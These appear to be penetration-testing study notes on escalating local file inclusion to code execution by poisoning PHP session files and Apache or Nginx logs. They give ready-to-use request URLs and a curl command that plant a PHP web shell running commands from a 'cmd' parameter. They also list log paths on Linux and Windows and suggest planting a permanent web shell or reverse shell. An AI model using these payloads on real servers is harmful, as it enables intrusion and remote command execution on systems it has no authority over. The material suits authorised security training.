Writing PHP code in a field we control that gets logged into a log file and then include that log file to execute the PHP code.
- The PHP application should have read privileges over the logged files

Functions with execute privileges vulnerable to these attacks:
PHP: include() / include_once(), require() / require_once()
NodeJS: res.render()
Java: import
.NET: include

## PHP Session Poisoning
PHPSESSID cookies are stored on backend
- Linux: /var/lib/php/sessions/
- Windows: C:\Windows\Temp\
- If PHPSESSID cookie is el4k, then it would be located at /var/lib/php/sessions/sess_el4k

**LFI of cookie file
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
- This should show our custom value for the page, session_poisoning, which shows we can control the page
- Now, POISON cookie file
```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

**Note
To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.


## Server Log Poisoning
Apache and Nginx maintain log files, access.log and error.log. In access.log, it includes each request's User-Agent, so we can poison this.
- Need read-access over the logs.
- Nginx are readable by low privileges users (www-data)
- Apache are readable by high privileged users (root/adm)

**Log Locations:
Apache: /var/log/apache2 in Linux and C:\xampp\apache\logs on Windows
Nginx: /var/log/nginx on Linux and C:\nginx\log\ on Windows

**Check readable Log
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```
- We can read it. Now, poison the User-Agent header with Burp

**Poison the log file
```
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

Other system logs we can poison:
- /var/log/sshd.log
- /var/log/mail
- /var/log/vsftpd.log

This technique can be applied to ssh, ftp, or mail services. Use the username to input the PHP command, or the body of the email.
